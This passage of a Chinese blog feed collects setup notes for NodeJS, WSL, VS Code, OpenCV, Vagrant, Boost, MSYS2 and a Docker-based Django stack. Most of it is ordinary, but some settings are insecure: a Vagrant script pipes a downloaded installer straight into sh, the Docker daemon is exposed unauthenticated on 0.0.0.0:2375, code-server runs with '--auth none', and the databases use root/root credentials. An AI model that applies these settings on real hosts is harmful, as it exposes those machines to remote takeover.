class="number">2018-02-17T15:02:31+08:00</span>    <span class="comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span></span><br></pre></td></tr></table></figure>

<h4 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h4><p>&amp; 用来建立锚点，&lt;&lt; 表示合并到当前数据，* 用来引用锚点:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">defaults:</span> <span class="meta">&amp;defaults</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"></span><br><span class="line"><span class="attr">development:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_development</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="meta">*defaults</span></span><br><span class="line"></span><br><span class="line"><span class="attr">test:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_test</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="meta">*defaults</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 相当于</span></span><br><span class="line"></span><br><span class="line"><span class="attr">defaults:</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"></span><br><span class="line"><span class="attr">development:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_development</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"></span><br><span class="line"><span class="attr">test:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_test</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br></pre></td></tr></table></figure>


<p><a href="https://www.runoob.com/w3cnote/yaml-intro.html">参考 菜鸟教程</a></p>
]]></content>
      <categories>
        <category>开发运维</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Vagrant</tag>
      </tags>
  </entry>
  <entry>
    <title>配置各种环境</title>
    <url>/2020/03/29/%E8%BF%90%E7%BB%B4/Env/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h2 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>下载地址：<a href="http://nodejs.cn/download/">官方网站</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install cnpm -g --registry=https://registry.npm.taobao.org</span><br><span class="line"><span class="comment"># 如果计算机禁止脚本运行，执行下面步骤，选 A</span></span><br><span class="line">set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure>

<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="PyTorch"><a href="#PyTorch" class="headerlink" title="PyTorch"></a>PyTorch</h3><p>下载torch和torchvision</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">https://download.pytorch.org/whl/torch_stable.html</span><br></pre></td></tr></table></figure>

<p>安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install /path_to_file/torch...</span><br><span class="line">pip install /path_to_file/torchvision...</span><br></pre></td></tr></table></figure>

<h2 id="WSL"><a href="#WSL" class="headerlink" title="WSL"></a>WSL</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>可以到应用商店安装基于WSL的Ubuntu。下载安装完成后，可以通过命令切换到WSL 2。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wsl -l -v  <span class="comment"># 查看安装的子系统</span></span><br><span class="line">wsl --set-version Ubuntu-20.04 2  <span class="comment"># 切换到WSL 2</span></span><br></pre></td></tr></table></figure>

<p>查看所有安装的WSL：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> \\wsl$</span><br></pre></td></tr></table></figure>

<h3 id="WSL2-Docker"><a href="#WSL2-Docker" class="headerlink" title="WSL2 Docker"></a>WSL2 Docker</h3><p>更新系统到Windows 10 2004版本，打开WSL功能，下载安装<a href="https://docs.microsoft.com/zh-cn/windows/wsl/wsl2-kernel">WSL2补丁</a>。升级成功后，安装Docker安装包即可。</p>
<p>可以去CUDA官网下载<a href="https://developer.nvidia.com/cuda/wsl/download">WSL CUDA驱动</a>。</p>
<h3 id="迁移-WSL"><a href="#迁移-WSL" class="headerlink" title="迁移 WSL"></a>迁移 WSL</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wsl --shutdown  <span class="comment"># 关闭WSL</span></span><br><span class="line">wsl --<span class="built_in">export</span> docker-desktop-data E:\docker-desktop-data.tar  <span class="comment"># 导出数据</span></span><br><span class="line">wsl --unregister docker-desktop-data  <span class="comment"># 注销子系统</span></span><br><span class="line">wsl --import docker-desktop-data D:\wsl\docker-desktop-data\ E:\docker-desktop-data.tar --version 2  <span class="comment"># 重新挂载子系统到其他位置</span></span><br></pre></td></tr></table></figure>

<h3 id="开启-关闭-HyperV"><a href="#开启-关闭-HyperV" class="headerlink" title="开启 关闭 HyperV"></a>开启 关闭 HyperV</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform</span><br><span class="line">Disable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform</span><br></pre></td></tr></table></figure>


<h2 id="VS-Code"><a href="#VS-Code" class="headerlink" title="VS Code"></a>VS Code</h2><h3 id="开发-C"><a href="#开发-C" class="headerlink" title="开发 C++"></a>开发 C++</h3><h4 id="配置编译环境-MinGW-64"><a href="#配置编译环境-MinGW-64" class="headerlink" title="配置编译环境  MinGW-64"></a>配置编译环境  MinGW-64</h4><p><a href="https://www.jb51.net/softs/696088.html">点击进入MinGW-64下载页面</a>，下载完毕后，解压到一个固定的目录下，并将该目录的<code>../bin</code>目录添加至环境变量中。</p>
<p>打开CMD（或Power Shell）输入gcc测试环境是否配置成功。如果成功，则显示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc: fatal error: no input files</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure>

<h4 id="下载-Visual-Studio-Code"><a href="#下载-Visual-Studio-Code" class="headerlink" title="下载 Visual Studio Code"></a>下载 Visual Studio Code</h4><p><a href="https://aka.ms/win32-x64-user-stable">点击下载Visual Studio Code</a>，下载完毕后安装打开。进入程序后，在插件栏中安装<code>Code Run</code>，<code>C/C++</code>两款插件。安装完毕后重启编辑器。</p>
<p>Tips: 可以安装一个<code>Chinese</code>插件可以进行汉化。</p>
<h4 id="创建第一个项目"><a href="#创建第一个项目" class="headerlink" title="创建第一个项目"></a>创建第一个项目</h4><p>打开一个空文件夹，在其下面创建<code>.vscode</code>文件夹（注意有个点），依次点击菜单栏的<code>调试</code>-&gt;<code>添加配置</code>选项，添加一个<code>C++(GDB/LLDB)</code>配置，第二步选择<code>g++.exe build and debug active file</code>，之后会启动调试，并显示调试失败。这里点击取消，编辑器将自动创建<code>launch.json</code>文件和<code>tasks.json</code>文件，这个文件中可以配置启动程序和调试程序所需的相关内容。这两个文件默认情况下是不需要修改的。如果调试失败，可以参考如下两个配置文件进行修改。文件内容如下：</p>
<p><code>launch.json</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>      <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span>      <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>          <span class="punctuation">&#123;</span>              <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;(gdb) Launch&quot;</span><span class="punctuation">,</span> <span class="comment">// 配置名称            &quot;type&quot;: &quot;cppdbg&quot;,       // 这里只能为cppdbg              &quot;request&quot;: &quot;launch&quot;,    // 请求配置类型，可以为launch（启动）或attach（附加）              &quot;program&quot;: &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;,// 将要进行调试的程序的路径              &quot;args&quot;: [],             // 程序调试时传递给程序的命令行参数，一般设为空即可              &quot;stopAtEntry&quot;: false,   // 设为true时程序将暂停在程序入口处，一般设置为false              &quot;cwd&quot;: &quot;$&#123;workspaceFolder&#125;&quot;, // 调试程序时的工作目录，一般为$&#123;workspaceFolder&#125;即代码所在目录              &quot;environment&quot;: [],              &quot;externalConsole&quot;: true, // 调试时是否显示控制台窗口，一般设置为true显示控制台              &quot;MIMode&quot;: &quot;gdb&quot;,              &quot;miDebuggerPath&quot;: &quot;gdb.exe&quot;, // miDebugger的路径，注意这里要与MinGw的路径对应              &quot;preLaunchTask&quot;: &quot;g++&quot;, // 调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc              &quot;setupCommands&quot;: [                  &#123;   		    &quot;description&quot;: &quot;Enable pretty-printing for gdb&quot;,                      &quot;text&quot;: &quot;-enable-pretty-printing&quot;,                      &quot;ignoreFailures&quot;: true                  &#125;              ]          &#125;      ]  &#125;</span></span><br></pre></td></tr></table></figure>

<p><code>tasks.json</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>    <span class="comment">// See https://go.microsoft.com/fwlink/?LinkId=733558     // for the documentation about the tasks.json format    &quot;version&quot;: &quot;2.0.0&quot;,    &quot;tasks&quot;: [        &#123;            &quot;type&quot;: &quot;shell&quot;,            &quot;label&quot;: &quot;g++&quot;,            &quot;command&quot;: &quot;g++.exe&quot;,            &quot;args&quot;: [                   &quot;-g&quot;,                &quot;$&#123;file&#125;&quot;,                &quot;-o&quot;,                &quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;            ],            &quot;options&quot;: &#123;                &quot;cwd&quot;: &quot;&quot;            &#125;,            &quot;problemMatcher&quot;: [                &quot;$gcc&quot;            ]        &#125;    ]&#125;</span></span><br></pre></td></tr></table></figure>

<p>配置完成后，添加一个简单的<code>CPP</code>文件，分别调试、直接运行一次测试功能是否正确。如果发现不能调试程序，可尝试重启编辑器。</p>
<p><code>main.cpp</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span>int main(void)&#123;    std::cout&lt;&lt;<span class="string">&quot;Hello World...&quot;</span>&lt;&lt;std::endl;    return 0;&#125;</span></span><br></pre></td></tr></table></figure>

<p>安装插件<code>Code Runner</code>，配置参数为<code>Run in Terminal</code></p>
<h3 id="Web-版-VS-Code"><a href="#Web-版-VS-Code" class="headerlink" title="Web 版 VS Code"></a>Web 版 VS Code</h3><p>首先确保安装<code>yarn</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org/npm i -g yarnyarn config <span class="built_in">set</span> registry https://registry.npm.taobao.org/</span><br></pre></td></tr></table></figure>

<p>下载安装运行代码（Windows 下）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/microsoft/vscode.gitcd vscodeyarnyarn watchyarn gulp watch-web  yarn web</span><br></pre></td></tr></table></figure>

<p>（Linux下，Code Server）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/cdr/code-server.gitcd code-serversudo ./install.shsudo code-server --bind-addr 0.0.0.0:8080 --auth none</span><br></pre></td></tr></table></figure>

<h3 id="VS-Code-Docker"><a href="#VS-Code-Docker" class="headerlink" title="VS Code + Docker"></a>VS Code + Docker</h3><p>在Docker服务器上，修改文件<code>/lib/systemd/system/docker.service</code>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375</span><br></pre></td></tr></table></figure>

<p>再重启Docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reloadsystemctl restart docker</span><br></pre></td></tr></table></figure>

<p>在VS Code上安装Docker插件，打开设置，搜索<code>docker:host</code>，配置远程服务器。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tcp://192.168.1.101:2375</span><br></pre></td></tr></table></figure>

<p>打开<code>Remote Container</code>，使用<code>Try a Sample</code>开启远程Docker。</p>
<h3 id="VS-Code-远程开发"><a href="#VS-Code-远程开发" class="headerlink" title="VS Code 远程开发"></a>VS Code 远程开发</h3><p>开启OpenSSH服务，并在VS Code中安装插件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Remote - SSHRemote - WSLRemote - Container</span><br></pre></td></tr></table></figure>

<p>完成后，在左侧<code>远程资源管理器</code>中添加远程主机。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh user@host</span><br></pre></td></tr></table></figure>

<p>并提示保存config文件。如果需要密钥，可以用<code>ssh-add</code>添加密钥。</p>
<h2 id="OpenCV"><a href="#OpenCV" class="headerlink" title="OpenCV"></a>OpenCV</h2><h3 id="OpenCV-CMake-编译"><a href="#OpenCV-CMake-编译" class="headerlink" title="OpenCV CMake 编译"></a>OpenCV CMake 编译</h3><p>使用CMake进行MingW编译。需要安装<code>CMake</code>和<code>MingW-w64</code>(QT自带)或MSVC(Visual Studio 20xx)。</p>
<p>选择源程序目录<code>Source</code>和输出目录<code>Build</code>，点击<code>Configure</code>，选择<code>MinGW Makefiles</code>，选择<code>Finish</code>，等待完成。</p>
<p>完成后，添加或修改如下选项：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">BUILD_opencv_world             ONCMAKE_PREFIX_PATH              D:\Qt\<span class="number">5.14</span>.<span class="number">2</span>\mingw73_64\lib\cmake\Qt5   <span class="comment"># 如果是MSVC则不需要CMAKE_BUILD_TYPE               Debug                                   # 如果是MSVC则不需要OPENCV_ENABLE_ALLOCATOR_STATS  OFFWITH_OPENGL                    ONWITH_QT                        ON                                      # 如果使用 QT 就打开</span></span><br></pre></td></tr></table></figure>

<p>点击<code>Generate</code>。</p>
<p>待生成后，如果是Mingw，则使用命令行进入<code>Build</code>目录，输入指令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">D:\Qt\Tools\mingw730_64\bin\mingw32-make.exe -j 4D:\Qt\Tools\mingw730_64\bin\mingw32-make.exe install</span><br></pre></td></tr></table></figure>

<p>注意，为了防止混淆，这里尽量使用完整的make程序的路径，因为还存在mingw730_32的32位编译器。</p>
<p>如果是MSVC，则打开OpenCV.sln，在上方选择Debug或是Release，再右键解决方案，点击生成。生成后，右键Install，生成即可安装。</p>
<p>如果出现<code>File Too Big</code>错误，可以修改相应的文件，如<code>D:\OpenCV4\opencv\build-mingw\modules\core\CMakeFiles\opencv_perf_core.dir\flags.make</code>：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">CXX_FLAGS = -Wa,-mbig-obj ...</span><br></pre></td></tr></table></figure>

<p>或直接修改OpenCV源代码中的<code>CMakeFiles.txt</code></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ========================== C/C++ options ==========================if(CMAKE_COMPILER_IS_GNUCXX)    add_compile_options(-Wa,-mbig-obj)endif(CMAKE_COMPILER_IS_GNUCXX)</span></span><br></pre></td></tr></table></figure>

<h3 id="OpenCV-Visual-Stuido"><a href="#OpenCV-Visual-Stuido" class="headerlink" title="OpenCV + Visual Stuido"></a>OpenCV + Visual Stuido</h3><p>打开项目属性，编辑如下选项：</p>
<p>配置：<code>Debug</code>；平台：<code>x64</code></p>
<p>调试 -&gt; 环境：<code>PATH=D:\OpenCV4\opencv\build\x64\vc15\bin;%PATH%</code>，即配置OpenCV的环境变量。</p>
<p>VC++目录：</p>
<ul>
<li>包含目录：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\OpenCV4\opencv\build\includeD:\OpenCV4\opencv\build\include\opencv2</span><br></pre></td></tr></table></figure>

<ul>
<li>库目录：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\OpenCV4\opencv\build\x64\vc15\lib</span><br></pre></td></tr></table></figure>

<p>连接器 -&gt; 输入 -&gt; 附加依赖项：<code>opencv_world430d.lib</code><br>如果配置的是<code>Release</code>，则输入<code>opencv_world430.lib</code></p>
<h3 id="OpenCV-QT-MingW"><a href="#OpenCV-QT-MingW" class="headerlink" title="OpenCV + QT + MingW"></a>OpenCV + QT + MingW</h3><p>打开QT，新建工程，在.PRO文件中加入</p>
<figure class="highlight qt"><table><tr><td class="code"><pre><span class="line">INCLUDEPATH += <span class="attribute">D</span>:\OpenCV4\opencv\build-mingw\install\include\INCLUDEPATH += <span class="attribute">D</span>:\OpenCV4\opencv\build-mingw\install\include\opencv2LIBS += <span class="attribute">D</span>:\OpenCV4\opencv\build-mingw\install\x64\mingw\bin\libopencv_core430.dllLIBS += <span class="attribute">D</span>:\OpenCV4\opencv\build-mingw\install\x64\mingw\bin\libopencv_highgui430.dllLIBS += <span class="attribute">D</span>:\OpenCV4\opencv\build-mingw\install\x64\mingw\bin\libopencv_imgcodecs430.dllLIBS += <span class="attribute">D</span>:\OpenCV4\opencv\build-mingw\install\x64\mingw\bin\libopencv_imgproc430.dllLIBS += <span class="attribute">D</span>:\OpenCV4\opencv\build-mingw\install\x64\mingw\bin\libopencv_features2d430.dllLIBS += <span class="attribute">D</span>:\OpenCV4\opencv\build-mingw\install\x64\mingw\bin\libopencv_calib3d430.dll</span><br></pre></td></tr></table></figure>

<p>之后构建程序并执行。如果出现程序无法打开，则可以做如下两种方案解决问题。<br>方案 1：将<code>D:\OpenCV4\opencv\build-mingw\install\x64\mingw\bin\</code>目录添加到环境变量下（可以在QT中设置项目独立环境变量：项目-&gt;构建环境）。<br>方案 2：将用到的DLL文件复制到<code>\build-xxxx-Desktop_Qt_5_14_2_MinGW_64_bit-Debug\debug</code>目录下。</p>
<h2 id="Vagrant"><a href="#Vagrant" class="headerlink" title="Vagrant"></a>Vagrant</h2><h3 id="开机脚本"><a href="#开机脚本" class="headerlink" title="开机脚本"></a>开机脚本</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Version Ubuntu 16.04sudo mv /etc/apt/sources.list /etc/apt/sources.list.backsudo cat&gt;&gt;/etc/apt/sources.list&lt;&lt;EOF# deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricteddeb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverseEOFsudo apt-get updatecurl -sSL https://get.docker.com | shsudo cat&gt;&gt;/etc/docker/daemon.json&lt;&lt;EOF&#123;  &quot;registry-mirrors&quot;: [&quot;https://sfpj1t4c.mirror.aliyuncs.com&quot;]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart dockersudo apt-get install -y docker-compose</span></span><br></pre></td></tr></table></figure>

<h2 id="Boost"><a href="#Boost" class="headerlink" title="Boost"></a>Boost</h2><p><a href="https://www.boost.org/">下载Boost</a>，解压到某一路径。</p>
<p>为VS 2019编译，使用<code>x86_x64 Cross Tools Command Prompt for VS 2019</code>工具，打开解压目录，运行<code>bootstrap.bat</code>，创建编译文件。<br>创建完成后执行指令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">b2.exe --toolset=msvc-14.1 architecture=x86 address-model=64 <span class="built_in">link</span>=static --build-type=complete --with-system --with-thread --with-date_time --with-filesystem --with-serialization</span><br></pre></td></tr></table></figure>


<p>如果为QT编译，则直接用命令行打开，输入：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bootstrap.bat gcc<span class="comment"># 等待完成后输入b2.exe --toolset=gcc architecture=x86 address-model=64 link=static --build-type=complete --with-system --with-thread --with-date_time --with-filesystem --with-serialization</span></span><br></pre></td></tr></table></figure>

<p>编译完成即可。</p>
<p>之后将Boost加入到环境变量（%BOOST_DIR%）。</p>
<p>Visual Studio 中：<br>VC++包含目录中添加: %BOOST_DIR%;<br>VC++库目录中添加: %BOOST_DIR%\stage\lib;</p>
<p>QT 中：<br>INCLUDEPATH +&#x3D; %BOOST_DIR%&#x2F;bin&#x2F;include<br>LIBS +&#x3D; %BOOST_DIR%&#x2F;bin&#x2F;lib&#x2F;libboost_regex-mgw49-mt-1_56.a</p>
<h2 id="MSYS2"><a href="#MSYS2" class="headerlink" title="MSYS2"></a>MSYS2</h2><p>下载<a href="https://mirrors.tuna.tsinghua.edu.cn/msys2/distrib/x86_64/">MSYS2</a>，并安装。<br>配置环境变量到Path：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\msys64C:\msys64\usr\bin</span><br></pre></td></tr></table></figure>

<p>修改如下文件：<br>C:\msys64\etc\pacman.d\mirrorlist.mingw32<br>C:\msys64\etc\pacman.d\mirrorlist.mingw64<br>C:\msys64\etc\pacman.d\mirrorlist.msys</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">## mirrorlist.mingw32#### 32-bit Mingw-w64 repository mirrorlist#### 清华大学软件镜像Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/i686/## 中科大镜像Server = http://mirrors.ustc.edu.cn/msys2/mingw/i686/## msys2.orgServer = http://repo.msys2.org/mingw/i686/## Sourceforge 镜像Server = https://sourceforge.net/projects/msys2/files/REPOS/MINGW/i686/## The UK Mirror Service Sourceforge mirrorServer = http://sourceforge.mirrorservice.org/m/ms/msys2/REPOS/MINGW/i686/## Sourceforge.netServer = http://downloads.sourceforge.net/project/msys2/REPOS/MINGW/i686## FutureAt 镜像Server = http://www2.futureware.at/~nickoe/msys2-mirror/msys/i686/## mirrorlist.mingw64#### 64-bit Mingw-w64 repository mirrorlist#### 清华大学软件镜像Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/x86_64/## 中科大镜像Server = http://mirrors.ustc.edu.cn/msys2/mingw/x86_64/## msys2.orgServer = http://repo.msys2.org/mingw/x86_64/## Sourceforge 镜像Server = https://sourceforge.net/projects/msys2/files/REPOS/MINGW/x86_64/## The UK Mirror Service Sourceforge mirrorServer = http://sourceforge.mirrorservice.org/m/ms/msys2/REPOS/MINGW/x86_64/## Sourceforge.netServer = http://downloads.sourceforge.net/project/msys2/REPOS/MINGW/x86_64## FutureAt 镜像Server = http://www2.futureware.at/~nickoe/msys2-mirror/msys/x86_64/## mirrorlist.msys#### MSYS2 repository mirrorlist#### 清华大学软件镜像Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/$arch## 中科大镜像Server = http://mirrors.ustc.edu.cn/msys2/msys/$arch## msys2.orgServer = http://repo.msys2.org/msys/$arch## Sourceforge 镜像Server = https://sourceforge.net/projects/msys2/files/REPOS/msys/$arch## The UK Mirror Service Sourceforge mirrorServer = http://sourceforge.mirrorservice.org/m/ms/msys2/REPOS/msys/$arch## Sourceforge.netServer = http://downloads.sourceforge.net/project/msys2/REPOS/msys/$arch## FutureAt 镜像Server = http://www2.futureware.at/~nickoe/msys2-mirror/msys/$arch</span></span><br></pre></td></tr></table></figure>

<p>更新软件包：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pacman -Sypacman -Su</span><br></pre></td></tr></table></figure>

<p>搜索软件包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pacman -Sl | grep git</span><br></pre></td></tr></table></figure>

<p>安装Git：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pacman -S git</span><br></pre></td></tr></table></figure>




<h2 id="Windows-Clang"><a href="#Windows-Clang" class="headerlink" title="Windows Clang"></a>Windows Clang</h2><ol>
<li><a href="https://releases.llvm.org/download.html">下载Clang-LLVM for Windows</a>，安装后添加到环境变量Path中。</li>
<li>安装<a href="http://www.mingw-w64.org/doku.php">MinGW-w64</a>，添加bin目录到环境变量Path中。</li>
<li>或使用MSVC。</li>
<li>使用Clang编译程序。</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">clang++ -target x86_64-pc-windows-mingw </span><br></pre></td></tr></table></figure>

<h2 id="前后端分离开发"><a href="#前后端分离开发" class="headerlink" title="前后端分离开发"></a>前后端分离开发</h2><h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Use root/example as user/password credentials</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">django:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">python:3.8</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8000</span><span class="string">:8000</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">/usr/src/app</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">DJANGO_DATABASE:</span> <span class="string">backend</span></span><br><span class="line">      <span class="attr">DJANGO_DATABASE_HOST:</span> <span class="string">db</span></span><br><span class="line">      <span class="attr">DJANGO_DATABASE_PORT:</span> <span class="number">3306</span></span><br><span class="line">      <span class="attr">DJANGO_DATABASE_PSWD:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./django:/usr/src/app</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">bash</span> <span class="string">-c</span> <span class="string">&quot;pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple &amp;&amp; python manage.py makemigrations &amp;&amp; python manage.py migrate &amp;&amp; python manage.py runserver 0.0.0.0:8000&quot;</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:5.7</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">backend</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3306</span><span class="string">:3306</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">~/sql_django:/var/lib/mysql</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">80</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./vue:/usr/share/nginx/html</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./vue_conf/nginx.conf:/etc/nginx/nginx.conf</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">adminer:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">adminer</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9080</span><span class="string">:8080</span></span><br></pre></td></tr></table></figure>



<h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><h4 id="配置开发环境中的环境变量"><a href="#配置开发环境中的环境变量" class="headerlink" title="配置开发环境中的环境变量"></a>配置开发环境中的环境变量</h4><p>在PyCharm中的<code>Edit Configurations</code>中，修改<code>Environment Variables</code>，添加环境变量。这样在Docker中就可以使用<code>environment</code>选项配置环境了。</p>
<p>在Python文件中，使用如下方式载入环境变量。</p>
